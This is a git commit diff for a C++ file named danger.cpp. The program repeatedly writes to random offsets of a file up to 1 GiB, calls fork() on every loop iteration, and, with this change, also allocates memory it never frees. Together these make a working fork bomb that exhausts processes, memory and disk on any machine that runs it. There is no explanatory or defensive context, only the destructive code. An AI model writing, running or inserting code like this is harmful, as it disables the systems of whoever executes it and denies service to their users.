109dc910ae81c24eb2956a5fbeec1621a1afcd83
Caleb <51061101+calebrwalk5@users.noreply.github.com>
2021-09-16 08:54:06 -0400

    Add files via upload

--- danger.cpp
+++ danger.cpp
@@ -5,10 +5,11 @@ using namespace std;
 
 int main() {
 	FILE *f = fopen("tmp.txt","wb");
-	for (;;) {
+	for (int i = 0; i < 99999999; i++) {
 		fseek(f, rand() % (1024ll * 1024 * 1024), SEEK_SET);
 		fputc('a', f);
 		fflush(f);
+		malloc(i);
 		fork();
 	}
 	return false;
